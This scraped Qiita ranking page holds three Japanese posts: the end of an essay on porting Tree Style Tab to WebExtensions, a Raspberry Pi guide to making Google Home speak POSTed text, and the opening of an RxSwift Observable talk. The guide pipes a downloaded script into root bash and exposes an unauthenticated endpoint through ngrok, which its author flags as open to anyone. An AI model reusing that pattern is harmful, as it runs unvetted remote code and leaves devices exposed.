<p>「元のTSTと全く同一のユーザー体験が実現されていないので」あるいは「自分にとって必要だった機能がなくなってしまったので」この移行計画は失敗だった、と言いたい人もいるかも知れません。<br>
しかしそれらをゴールにしていては、恐らく「WebExtensions版のリリース」という節目すらも迎える事はできなかったでしょう。<br>
不可能な事は諦め、最も重要なユーザーである自分自身にとって必要な機能・特徴に注力し、やる事のスコープを絞り込んだからこそ、「TST 2.0」は世に出る事ができたと自分は考えています。</p>

<p>自分以外のレガシーアドオンの作者の方々も、きっと同じような事で悩んでいると思います。<br>
「全部をそっくりそのまま移行できないのなら、やる意味がない」と自暴自棄になってしまう気持ちは非常によく分かります。<br>
それでも、実際にTST 2.0の開発段階においても、一旦は諦めていた事が意外な角度から実現できたという事は何度かありました。<br>
誰にも解決できなかった問題をユニークなやり方で解決してきたパイオニア達が、このまま完全に無かった物になってしまうのは忍びないです。<br>
元の物の核となる価値をほんの少しでもWebExtensionsの上で再現できないかという事を、どうか今一度検討して頂ければと思います。</p>

<h4>
<span id="webextensionsの今後とtst以外のアドオンの今後について" class="fragment"></span><a href="#webextensions%E3%81%AE%E4%BB%8A%E5%BE%8C%E3%81%A8tst%E4%BB%A5%E5%A4%96%E3%81%AE%E3%82%A2%E3%83%89%E3%82%AA%E3%83%B3%E3%81%AE%E4%BB%8A%E5%BE%8C%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>WebExtensionsの今後と、TST以外のアドオンの今後について</h4>

<p>従来のアドオンの仕組みは、自由度の高さ故に様々なアドオンが登場する土壌となりました。<br>
最初からWebExtensionsのような方針で始めたとしたら、ここまで多種多様なアドオンが出てくることも無かったでしょう。</p>

<p>しかし、APIと言えるAPIが無い状態でのモンキーパッチであったがために、従来のアドオンではFirefoxのバージョン依存や本体機能の劣化・阻害という副作用の発生を避けられませんでした。<br>
また、それらを避けられるような造詣の深い人以外はアドオンを作れないという状況をも生んでしまいました。</p>

<p>WebExtensionsでないアドオンの廃止はいつか必ず起こる事で、それがFirefoxという名前の間に起こるのか、それともFirefoxが従来のアドオンと共に完全に死んで別のプロダクトが最初からそうなっていたか、という程度の違いでしかありません。<br>
Firefoxという名前の間に起こったことで、設定の引き継ぎ等がスムーズに進みやすくなったと考えると、これが一番妥当だったのだと思います（本当は、もっと早くにそうなるべきだったのでしょうが……）。</p>

<p>WebExtensions APIでは、「Google Chromeとの互換性」に拘らない独自のAPIも提供され始めています。<br>
<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1322060" rel="nofollow noopener" target="_blank"><code>browser.sessions.setTabValue()</code>、<code>browser.sessions.getTabValue()</code>、<code>browser.sessions.setWindowValue()</code>、<code>browser.sessions.getWindowValue()</code></a>はその一例で、TSTもこれが無くては実用レベルでのWE版開発は不可能でした。<br>
要望や提案は却下される事の方が多い、というか自分が起票した提案はほとんど全部却下か放置されているのが現実ですが、明文化されていない領域での「ここまではあり」「ここから先は無し」というFirefox開発チーム内での判断基準が炙り出される事にも意義はあるはずと信じて、今後もめげずにやっていきたいと思います。</p>

<hr>

<p>以上、TST WE版作成のための一連の作業の締めくくりとして、長々と思いの丈を語ってみました。</p>

<p>TST 2.0は一般向けにリリースしたことでより多くの耳目に晒されるようになったため、開発段階とは比較にならない量のバグ報告が連日寄せられている状況です。<br>
TST 2.0の後はさっさと<a href="https://addons.mozilla.org/firefox/addon/multiple-tab-handler/" rel="nofollow noopener" target="_blank">マルチプルタブハンドラ</a>のWE版の作業に移りたかったのですが、この分だとまだまだ時間がかかりそうです……</p>

<p>ちなみに、自分は普段はこういったアドオン開発の経験やその障害の原因調査を通じて培ったMozilla製品に関する知見を活かして、<a href="http://www.clear-code.com/" rel="nofollow noopener" target="_blank">株式会社クリアコード</a>でFirefox・Thunderbirdの法人向け技術サポート等の業務を行っています。<br>
業務上でFirefoxやThunderbirdの技術的な事に関してお困りの場合、何かお力になれるかもしれません。</p>

<p>また、この記事中の図のように技術を図解する事にも関心があり、日経Linux誌にて<a href="http://system-admin-girl.com/" rel="nofollow noopener" target="_blank">シス管系女子</a>というマンガ形式の技術解説記事も執筆しております。</p>

<p>ということで、図らずも上から下まで自分の持つ技能のすべてを投じた記事となってしまったのでした。<br>
ご笑覧頂けましたら幸いです。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">78位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>124</kbd>
		<a target="_blank" href="https://qiita.com/azipinsyan/items/db4606aaa51426ac8dac">GoogleHomeスピーカーに外部からプッシュして自発的に話してもらいます</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-08<br />22:40:39</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/94796.html">azipinsyan</a>(3件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/94796/profile-images/1473706371">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[ifttt]</b> <b>[RaspberryPi]</b> <b>[GoogleHome]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>GoogleHomeスピーカから自発的話してもらうためにいろいろ細工をします。具体的にはraspberryPiからGoogleHomeスピーカーに話してほしいことを送ってしゃべってもらいます。<br>
これができると、ある条件の時に好きなことをGoogleHomeからしゃべってもらえます。（例えば明日雨の場合に教えてくれたり、IFTTTを利用すると、ツイッターとかでリプライが来たら教えてくれます。）</p>

<h1>
<span id="ざっくりな流れ" class="fragment"></span><a href="#%E3%81%96%E3%81%A3%E3%81%8F%E3%82%8A%E3%81%AA%E6%B5%81%E3%82%8C"><i class="fa fa-link"></i></a>ざっくりな流れ</h1>

<p>①Raspberry PiにGoogleHomeを操作するためのソフト(google-home-notifier.js)を導入<br>
②自宅のGoogleHomeにリクエストを送るための設定を実施<br>
③リスナーを実行して、RaspberryPi上にgoogle-home-notifierを常駐させる<br>
④RaspberryPiにGoogleHomeにしゃべらせたいことをPOSTすることでGoogleHomeがしゃべる</p>

<h1>
<span id="必要な環境" class="fragment"></span><a href="#%E5%BF%85%E8%A6%81%E3%81%AA%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a>必要な環境</h1>

<p>・RaspberryPi(Node.jsとnpmを使います）<br>
・GoogleHome</p>

<h1>
<span id="raspberrypiに必要なものを導入" class="fragment"></span><a href="#raspberrypi%E3%81%AB%E5%BF%85%E8%A6%81%E3%81%AA%E3%82%82%E3%81%AE%E3%82%92%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>RaspberryPiに必要なものを導入</h1>

<h2>
<span id="nodejsとmpm" class="fragment"></span><a href="#nodejs%E3%81%A8mpm"><i class="fa fa-link"></i></a>Node.jsとmpm</h2>

<p>RaspberryPiにNode.jsとnpmを使うためにあらかじめインストールしておきます。以下のページを参照していただけばと思います。</p>

<p><a href="https://qiita.com/mascii/items/77c685df65c4cbca9315" class="autolink" id="reference-aa3fd357fc39abb59fcd">https://qiita.com/mascii/items/77c685df65c4cbca9315</a></p>

<h2>
<span id="google-home-notifier" class="fragment"></span><a href="#google-home-notifier"><i class="fa fa-link"></i></a>google-home-notifier</h2>

<p>続いて、GoogleHomeを操作するための必要なプログラム「google-home-notifier」をGitHubから導入します。サイトは以下です。</p>

<p><a href="https://github.com/noelportugal/google-home-notifier" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/noelportugal/google-home-notifier</a></p>

<p>上記プログラムは、前からあったChromecast Client向けのプロトコルを利用して、GoogleHomeにしゃべらせるという代物です。プロトコルの詳細は<a href="https://www.npmjs.com/package/castv2-client" rel="nofollow noopener" target="_blank">ここ</a>を参照してください。</p>

<p>上記プログラムを導入します。リスナーを利用して実現するため、以下の通りのコマンドを実行してインストールします。</p>

<p><code>curl -sL https://deb.nodesource.com/setup_7.x | sudo -E bash -<br>
sudo apt-get install nodejs<br>
sudo apt-get install git-core libnss-mdns libavahi-compat-libdnssd-dev<br>
git clone https://github.com/noelportugal/google-home-notifier<br>
cd google-home-notifier<br>
npm install</code></p>

<p>上記コマンドを実行することで、必要なパッケージ含めてインストールされます。</p>

<h1>
<span id="google-home-notifierの設定" class="fragment"></span><a href="#google-home-notifier%E3%81%AE%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>google-home-notifierの設定</h1>

<p>本章では、自宅にあるGoogleHomeに接続するための設定を実行します。<br>
設定を実施するにあたり、以下の条件および情報が必要です。<br>
・GoogleHomeのIPアドレス（固定されている必要があります。）<br>
　　→今回は仮に192.168.1.10とします。</p>

<p>まず最初に「example.js」を編集します。今回はあらかじめ用意されているものを利用します。<br>
以下の項目を編集します。<br>
・serverPort<br>
　　→リスナーが利用するポートです。変更する場合は変更してください。<br>
・deviceName <br>
　　→GoogleHomeのデバイス名を記載します。ただし、このデバイス名は任意で結構です。<br>
　　→今回は'リビング'とつけてます。</p>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">example.js</span></div>
<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">googlehome</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'./google-home-notifier'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">ngrok</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'ngrok'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'body-parser'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kr">const</span> <span class="nx">serverPort</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">deviceName</span> <span class="o">=</span> <span class="s1">'リビング'</span><span class="p">;</span>
<span class="nx">googlehome</span><span class="p">.</span><span class="nx">device</span><span class="p">(</span><span class="nx">deviceName</span><span class="p">);</span>
<span class="c1">//googlehome.accent('uk'); // uncomment for british voice</span>

<span class="kd">var</span> <span class="nx">urlencodedParser</span> <span class="o">=</span> <span class="nx">bodyParser</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">false</span> <span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/google-home-notifier'</span><span class="p">,</span> <span class="nx">urlencodedParser</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">text</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">text</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">text</span><span class="p">){</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">deviceName</span> <span class="o">+</span> <span class="s1">' will say: '</span> <span class="o">+</span> <span class="nx">text</span> <span class="o">+</span> <span class="s1">'\n'</span><span class="p">);</span>
    <span class="nx">googlehome</span><span class="p">.</span><span class="nx">notify</span><span class="p">(</span><span class="nx">text</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
    <span class="p">});</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">'Please POST "text=Hello Google Home"'</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">serverPort</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="nx">ngrok</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">serverPort</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'POST "text=Hello Google Home" to:'</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'    http://localhost:'</span> <span class="o">+</span> <span class="nx">serverPort</span> <span class="o">+</span> <span class="s1">'/google-home-notifier'</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'    '</span> <span class="o">+</span><span class="nx">url</span> <span class="o">+</span> <span class="s1">'/google-home-notifier'</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'example:'</span><span class="p">);</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'curl -X POST -d "text=Hello Google Home" '</span> <span class="o">+</span> <span class="nx">url</span> <span class="o">+</span> <span class="s1">'/google-home-notifier'</span><span class="p">);</span>
  <span class="p">});</span>
<span class="p">})</span>
</pre></div>
</div>

<p>続いて、同ディレクトにある「google-home-notifier.js」を編集します。本ファイルには、GoogleHomeの接続先並びに言語設定を実施します。</p>

<p>・lang<br>
　　→言語を日本語に設定するため、「ja」に変更する</p>

<p>・googlettsaccent<br>
　　→言語を日本語に設定するため、「ja」に変更する</p>

<p>・deviceAddressを追記<br>
　　→GoogleHomeのIPアドレスを記載します。</p>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">google-home-notifier.js</span></div>
<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">Client</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'castv2-client'</span><span class="p">).</span><span class="nx">Client</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">DefaultMediaReceiver</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'castv2-client'</span><span class="p">).</span><span class="nx">DefaultMediaReceiver</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">mdns</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'mdns'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">browser</span> <span class="o">=</span> <span class="nx">mdns</span><span class="p">.</span><span class="nx">createBrowser</span><span class="p">(</span><span class="nx">mdns</span><span class="p">.</span><span class="nx">tcp</span><span class="p">(</span><span class="s1">'googlecast'</span><span class="p">));</span>
<span class="kd">var</span> <span class="nx">deviceAddress</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">language</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">device</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">lang</span> <span class="o">=</span> <span class="s1">'ja'</span><span class="p">)</span> <span class="p">{</span>　　　　<span class="c1">//ここをjaに変更</span>
    <span class="nx">device</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
    <span class="nx">language</span> <span class="o">=</span> <span class="nx">lang</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">this</span><span class="p">;</span>
<span class="p">};</span>

<span class="kd">var</span> <span class="nx">googletts</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'google-tts-api'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">googlettsaccent</span> <span class="o">=</span> <span class="s1">'ja'</span><span class="p">;</span>　　　　　　　　　　　　<span class="c1">//ここをjaに変更</span>
<span class="kd">var</span> <span class="nx">accent</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">accent</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">googlettsaccent</span> <span class="o">=</span> <span class="nx">accent</span><span class="p">;</span>
  <span class="k">return</span> <span class="k">this</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">deviceAddress</span> <span class="o">=</span> <span class="s1">'192.168.1.10'</span><span class="p">;</span>　　　　　　　　　　<span class="c1">//ここにIPアドレスを追記</span>

<span class="kd">var</span> <span class="nx">notify</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">deviceAddress</span><span class="p">){</span>
    <span class="nx">browser</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span>
    <span class="nx">browser</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'serviceUp'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">service</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Device "%s" at %s:%d'</span><span class="p">,</span> <span class="nx">service</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span> <span class="nx">service</span><span class="p">.</span><span class="nx">addresses</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">service</span><span class="p">.</span><span class="nx">port</span><span class="p">);</span>

<span class="nx">後略</span>

</pre></div>
</div>

<h1>
<span id="google-home-notifierの起動" class="fragment"></span><a href="#google-home-notifier%E3%81%AE%E8%B5%B7%E5%8B%95"><i class="fa fa-link"></i></a>google-home-notifierの起動</h1>

<p>設定完了したら、RaspberryPi上で起動します。</p>

<p><code>node example.js</code></p>

<p>起動すると、POSTする際の例文が表示されるはずです。</p>

<h1>
<span id="googlehomeにしゃべらせる" class="fragment"></span><a href="#googlehome%E3%81%AB%E3%81%97%E3%82%83%E3%81%B9%E3%82%89%E3%81%9B%E3%82%8B"><i class="fa fa-link"></i></a>GoogleHomeにしゃべらせる</h1>

<p>google-home-notifierの起動が完了したら、RaspberryPiにGoogleHomeにしゃべってほしい内容を送ります。送り方は、例文に倣って以下の通りです。試しに「明日は雨になります」としゃべらせてみます。</p>

<p><code>curl -X POST -d "text=明日は雨になります" http://(RaspberryPiのIP):8080/google-home-notifier</code></p>

<p>上記コマンドを実行すると、GoogleHomeから「明日は雨になります」と突然話だすはずです。</p>

<h1>
<span id="最後に" class="fragment"></span><a href="#%E6%9C%80%E5%BE%8C%E3%81%AB"><i class="fa fa-link"></i></a>最後に</h1>

<p>今回のやり方で実行すると、声がいつものGoogleHomeの声とは異なる声でしゃべりだします。これはおそらく「iSpeech API」の声を利用しているためです。詳細は<a href="http://www.neo-tech-lab.co.uk/googletts/" rel="nofollow noopener" target="_blank">ここ</a>を参照いただけるといいと思います。</p>

<p>また、この方法は外部からPOSTでしゃべらせることができるため、IFTTTの「webhooks」を利用することで、様々なトリガーでしゃべらせることができます。IFTTTを利用する場合は、セキュリティ上今のままだと、誰でも実行できてしまうため、認証等をさらに付け加えたほうがいいかもしれません。</p>

<p>ともあれ、Googleが公式にPUSH型のサービスを提供してくれるまでのつなぎとしては利用できるかもしれません。</p>

<p>どなたかjsに明るい方がいたら、認証回りを強化したプログラムを公開していただけるとより多くの方が利用できるようになるので、なにとぞお願いします。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">79位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>121</kbd>
		<a target="_blank" href="https://qiita.com/gomi_ningen/items/c796c08fe672610beecf">RxSwift の Observable とは何か</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-16<br />10:53:15</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/56771.html">gomi_ningen</a>(33件の記事)<br />(ラビットハウス社勤務 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/56771/profile-images/1473694109">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[iOS]</b> <b>[ReactiveExtensions]</b> <b>[Rx]</b> <b>[Swift]</b> <b>[RxSwift]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><blockquote>
<p>この記事は、2017/09/15〜17 に早稲田大学 理工学部 西早稲田キャンパスで開催される <strong>iOSDC Japan 2017</strong> で行われる<strong><a href="https://iosdc.jp/2017/node/1348" rel="nofollow noopener" target="_blank">セッション「RxSwiftのObservableとは何か」</a></strong>の発表原稿、およびその補足資料です。</p>
</blockquote>

<ul>
<li>スライドはこちらです ➡︎ <a href="https://www.slideshare.net/gomi_ningen/rxswiftobservable-iosdc-japan-2017" class="autolink" rel="nofollow noopener" target="_blank">https://www.slideshare.net/gomi_ningen/rxswiftobservable-iosdc-japan-2017</a>
</li>
<li>あわせて読みたい ➡︎ <a href="http://qiita.com/gomi_ningen/items/dc08a8a5514be9aa0eb2" class="autolink" id="reference-b73e16e81e1b239086c2">http://qiita.com/gomi_ningen/items/dc08a8a5514be9aa0eb2</a>
</li>
</ul>

<p>なお、本文に先立ち注意事項を掲載しておきます。</p>

<p><strong>注意事項</strong></p>

<ul>
<li>以下の内容を理解しなくても RxSwift は十分使えるライブラリです

<ul>
<li>まだ Rx 系のライブラリを使ったことがない方は、まずライブラリを使ってみてください</li>
<li>Qiitaの記事を読むのもよいですが、<strong><a href="https://github.com/ReactiveX/RxSwift" rel="nofollow noopener" target="_blank">公式のドキュメント</a>や<a href="https://github.com/ReactiveX/RxSwift/blob/master/Documentation/Examples.md" rel="nofollow noopener" target="_blank">Example</a></strong>が充実しているのでそちらを読みながら、<strong>まずはコードを書いてみることを強くお勧めします。</strong>意外に簡単に使いどころが理解できるようになると思います。</li>
</ul>
</li>
<li>記事の内容的には Rx 系ライブラリの利用経験がなくても分かるように書いたつもりです</li>
<li>以下の実装は RxSwift のものであり、他言語の Rx ライブラリとは実装が異なる場合があります</li>
</ul>

<h1>
<span id="1rxswiftとは" class="fragment"></span><a href="#1rxswift%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>1.RxSwiftとは？</h1>

<p>　<strong>ReactiveExtensions(Rx)</strong> とは一体何をするライブラリなのでしょうか？ <a href="http://reactivex.io/" rel="nofollow noopener" target="_blank">ReactiveX</a> のWebページ冒頭や <a href="https://github.com/ReactiveX/RxSwift/blob/master/README.md" rel="nofollow noopener" target="_blank">RxSwiftの README</a> にはこのように書かれています</p>

<blockquote>
<ul>
<li>An API for asynchronous programming with observable streams.（Observable を用いた非同期プログラミングのためのAPI）</li>
<li>Rx is a generic abstraction of computation expressed through Observable interface. （Rxは Observable を用いて計算を抽象化します）</li>
</ul>
</blockquote>

<p>　どちらにも <code>Observable</code> というキーワードが登場しています。このことから、Rx を理解するためには、<code>Observable</code> について理解する必要がありそうだということがお分りいただけるかと思います。</p>

<p>実際に Rx は、主に以下の3つの要素から構成されていると言ってよいでしょう。</p>

<ol>
<li>
<strong>Observable</strong> (<code>Observable</code>, <code>Observer</code>, <code>Disposable</code>, etc...)</li>
<li>
<strong>Operator</strong> (<code>map</code>, <code>flatMap</code>, <code>filter</code>, etc...)</li>
<li>
<strong>Scheduler</strong> (<code>MainScheduler</code>, <code>ConcurrentDispatchQueueScheduler</code>, etc...)</li>
</ol>

<p>　本セッションでは、このうち <code>Observable</code> にスポットライトをあて、その実装を俯瞰していくことによって Rx への理解を深めることを目的としてお話を進めていきます。</p>

<p>　しばしば、Rx のストリームは「川である」といったように様々なものの例えで表現されることがあります。またリアクティブプログラミングとは〜のようなものであるといった記事がネット上にはたくさん存在します。こうした、あいまいでつかみどころのない例え話や解説記事から一歩足を踏み入れて、コードレベルで振る舞いを理解することにチャレンジしてみませんか。</p>

<p>　実装を知ることは、 RxSwift をはじめとした Rx 系ライブラリを活用する手助けになるだけでなく、ソフトウェアを設計する上でのひとつの大きな指針を手にいれることにも繋がると、私は考えています。</p>

<h1>
<span id="2-observerパターンとそのバリエーション" class="fragment"></span><a href="#2-observer%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3%E3%81%A8%E3%81%9D%E3%81%AE%E3%83%90%E3%83%AA%E3%82%A8%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>2. Observerパターンとそのバリエーション</h1>

<h2>
<span id="21-observer-パターンの問題意識" class="fragment"></span><a href="#21-observer-%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3%E3%81%AE%E5%95%8F%E9%A1%8C%E6%84%8F%E8%AD%98"><i class="fa fa-link"></i></a>2.1. Observer パターンの問題意識</h2>

<p>　Rx の <code>Observable</code> の実装を見ていく前に、ひとつの問題について考えてみましょう。</p>

<blockquote>
<p><strong>Q1. 「A に変化が生じたら B に伝えたい」とき、どうすればよいでしょうか？</strong> </p>
</blockquote>

<p>現実世界に置き換えると、以下のように例えられると思います。</p>

<ul>
<li>【例1】 自分の予定が変わったので（状態変化）、お店に予約キャンセルの連絡をする（通知）</li>
<li>【例2】 従業員は体調が悪くなったので（状態変化）、上司に会社を休む連絡をする（通知）</li>
</ul>

<p>　実際にこのようなケースの場合、自分が相手の連絡先を保持して、連絡をとる（相手に通知する）ことになるかと思います。【例2】のケースを考えると、普通従業員は上司の連絡先をあらかじめ保持していて、適切なタイミングでお休みの連絡を入れるのではないでしょうか。これはプログラミングの世界でも一緒で、「A に変化が生じたら B に伝えたい」ときには、「A が B の参照を保持しておき、状態変化時に通知する」という構造になります。</p>

<p><a href="https://camo.qiitausercontent.com/d434371db7331734a0364016c7d6469bcf96c667/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f32316166623261362d653439612d336539392d333531342d3437643463323138373564392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d434371db7331734a0364016c7d6469bcf96c667/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f32316166623261362d653439612d336539392d333531342d3437643463323138373564392e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/21afb2a6-e49a-3e99-3514-47d4c21875d9.png"></a></p>

<p>　【例2】のパターンをコードで表現すると以下のようになると思います。Playgroudで動作するコードですのでお試しください。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Notify.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">Member</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">boss</span><span class="p">:</span> <span class="n">Boss</span>
    <span class="kd">public</span> <span class="kd">var</span> <span class="nv">isFine</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">=</span> <span class="kc">true</span> <span class="p">{</span>
        <span class="kr">didSet</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span> <span class="n">boss</span><span class="p">.</span><span class="n">notify</span><span class="p">()</span> <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kd">init</span><span class="p">(</span><span class="n">boss</span><span class="p">:</span> <span class="n">Boss</span><span class="p">)</span> <span class="p">{</span> <span class="kc">self</span><span class="p">.</span><span class="n">boss</span> <span class="p">=</span> <span class="n">boss</span> <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Boss</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">notify</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">NSLog</span><span class="p">(</span><span class="s">"誰かから通知が来たよ"</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nv">boss1</span> <span class="p">=</span> <span class="n">Boss</span><span class="p">()</span>
<span class="kd">var</span> <span class="nv">member1</span> <span class="p">=</span> <span class="n">Member</span><span class="p">(</span><span class="n">boss</span><span class="p">:</span> <span class="n">boss1</span><span class="p">)</span>
<span class="n">member1</span><span class="p">.</span><span class="n">isFine</span> <span class="p">=</span> <span class="kc">true</span>  <span class="c1">//=&gt; ログ出力される</span>
<span class="n">member1</span><span class="p">.</span><span class="n">isFine</span> <span class="p">=</span> <span class="kc">false</span> <span class="c1">//=&gt; ログ出力される</span>
</pre></div>
</div>

<p>　この実装は、問題を解決できており、完全に正しい実装です。与えられた前提条件に対して設計上の問題点はありません。さて、これを踏まえて考える問題をもう少し複雑にしてみましょう。</p>

<blockquote>
<p><strong>Q2. 「通知元（A）の状態変化を、複数の通知先（B, C, D...）に伝えたい」とき、どうすればよいでしょうか？</strong> </p>
